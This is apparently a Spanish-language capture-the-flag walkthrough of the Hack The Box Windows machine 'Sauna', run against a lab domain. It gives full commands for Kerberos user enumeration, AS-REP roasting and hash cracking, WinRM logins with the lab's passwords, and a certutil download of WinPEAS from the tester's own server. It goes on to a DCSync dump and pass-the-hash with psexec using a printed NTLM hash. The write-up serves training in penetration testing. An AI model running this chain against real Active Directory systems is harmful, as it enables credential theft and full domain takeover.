## Resumen
Sauna es una máquina Windows de dificultad fácil que incluye enumeración y explotación de Active Directory. Los posibles nombres de usuario se pueden derivar de los nombres completos de los empleados que aparecen en el sitio web. Con estos nombres de usuario, se puede realizar un ataque ASREPRoasting, que genera un hash para una cuenta que no requiere preautenticación Kerberos. Este hash se puede someter a un ataque de fuerza bruta sin conexión para recuperar la contraseña en texto plano de un usuario que pueda acceder al servidor mediante WinRM. Al ejecutar WinPEAS, se revela que otro usuario del sistema está configurado para iniciar sesión automáticamente e identifica su contraseña. Este segundo usuario también tiene permisos de administración remota de Windows. BloodHound revela que este usuario tiene el derecho extendido DS-Replication-Get-Changes-All, lo que le permite extraer hashes de contraseñas del controlador de dominio en un ataque DCSync. La ejecución de este ataque devuelve el hash del administrador de dominio principal, que se puede utilizar con psexec.py de Impacket para obtener una shell en el equipo como NT_AUTHORITY\SYSTEM.
### Herramientas

- Nmap
- Gobuster
- Smbmap
- Kerbrute
- GetNPUsers
- Hashcat
- Evil-winrm
- Winpeas
- Bloodhound
- Secretsdump
- Psexec

## Escaneo y enumeración
Hacemos nuestro escaneo de puertos hacía la IP buscando los abiertos TCP y encontramos algunos que pueden ser de utilidad como el 80, 88, 389, 445... Los cuales iremos investigando

```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.29.44
```

![](Pasted%20image%2020260505163022.png)

Ahora haré un escaneo más específico de versión para ver antes que servicios estamos. Y se puede ver que estamos ante un domino llamado egotistical-bank.local
```bash
sudo nmap -sCV 10.129.29.44
```

![](Pasted%20image%2020260505163547.png)


Investigando en su aplicación web encontramos un apartado en el que podemos ver por quienes está formado el equipo, seguramente estos nombres podamos verlos dentro del dominio

![](Pasted%20image%2020260505163739.png)

Ahora haré fuzzing a la web para comprobar si puede existir alguna información que nos sirva. No encontramos nada interesante

```bash
gobuster dir --url http://10.129.29.44/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt
```

![](Pasted%20image%2020260505163952.png)

Intentando listar los archivos compartidos como anónimo no tendremos permisos

![](Pasted%20image%2020260505164246.png)

Ahora procederé a hacer fuerza bruta con la aplicación kerbrute (https://kerbrute.com/#Installation) para poder encontrar usuarios que se encuentren en el dominio con el siguiente diccionario de Usuarios (https://github.com/danielmiessler/seclists). Haciendo fuerza bruta encontraremos que existe el usuario fsmith, el cuál concide con los nombre del equipo visto en la web

```bash
apt -y install seclists
```


```bash
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.29.44
```

![](Pasted%20image%2020260505170949.png)


## Explotación
Seguidamente haré kerberoasting y probaré a sacar el hash de fsmith. Y se completará existosamente

```bash
./GetNPUsers.py -request EGOTISTICAL-BANK.LOCAL/fsmith -format hashcat -outputfile hashFsmith -dc-ip 10.129.29.44
```

![](Pasted%20image%2020260505172222.png)


Para crackear el hash lo meteremos en un fichero ejecutaremos el crackeo con alguna aplicación del estilo, en mi caso usaré hashcat y tendremos la contraseña de fsmith

```bash
hashcat -m 18200 hashfSmith /usr/share/wordlists/rockyou.txt --force
```


![](Pasted%20image%2020260505172257.png)


Usando la aplicación evil-winrm podremos tener acceso a una shell a su sistema como fsmith 

```bash
evil-winrm -i 10.129.29.44 -u fsmith -p Thestrokes23
```

![](Pasted%20image%2020260505173114.png)

En su escritorio conseguiremos encontrar la primera flag

![](Pasted%20image%2020260505173206.png)
## Escalado de privilegios 

Para enumerar el sistema usaremos WinPeas, para ello nos lo descargaremos creando en nuestro equipo un servidor python y luego usando certutil en Windows para instalarlo. Seguidamente podremos ejecutar el pograma y esperaremos a que nos de un diagnóstico

```powershell
certutil -urlcache -f http://10.10.14.180:8000/winPEASx64.exe Winpeas.exe
```

![](Pasted%20image%2020260505173812.png)

```powershell
C:\Users\FSmith\Desktop> .\Winpeas.exe cmd fast > sauna_winpeas_fast
```

En el fichero conseguimos encontrar unas credenciales de Autologon que posiblemente sean muy útiles

![](Pasted%20image%2020260505174435.png) 

Mirando los usuarios que hay con "net user" podemos ver que no existe el usuario svc_loanmanager pero sí existe svc_loanmgr que es muy parecido

![](Pasted%20image%2020260505174725.png) 

Así que probaremos a iniciar sesión con este usuario con evil-winrm y estaremos dentro exitosamente

```bash
evil-winrm -i 10.129.29.44 -u svc_loanmgr -p Moneymakestheworldgoround!
```

![](Pasted%20image%2020260505174910.png)


Ahora procederemos a iniciar bloodhound para visualizar como está organizado el Directorio Activo, además de poder saber que vector de ataque en cadena podemos llevar para elevar privilegios 

```bash
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.29.44 -c All
``` 

Iniciamos la base de datos de neo4j, cambiamos su contraseña y luego iniciamos desde la terminal bloodhound, importaremos los json en un archivo zip y en los nodos del usuario svc_loanmgr elegiremos Outboudn Object Control y veremos que tiene acceso a GetChanges y GetChangesAll para conseguir elevar privilegios

```bash
 $ bloodhound

 Starting neo4j
Neo4j is running at pid 108531

 Bloodhound will start
```


![](Pasted%20image%2020260505183350.png) 


Mirando en la rama de GetChanges podemos ver como se podría abusar para ejecutar el ataque, sería con un ataque de dcsync

![](Pasted%20image%2020260505183549.png) 


Para ello empezaremos usando la aplicación secretsdump de impacket y tendredemos accesos a los hashes de los usuarios en especial del Administrador


```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.29.44'
``` 

![](Pasted%20image%2020260505184003.png)



Concluiremos con el escalado de privilegios usando psexec para abrir una shell con permisos de administrador en este caso, ya que sabemos el hash del propio usuario Administrator

```bash
./psexec.py Administrator@10.129.29.44  -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
``` 

![](Pasted%20image%2020260505184210.png) 

Para finalizar encontraremos la última flag en su escritorio

![](Pasted%20image%2020260505184317.png)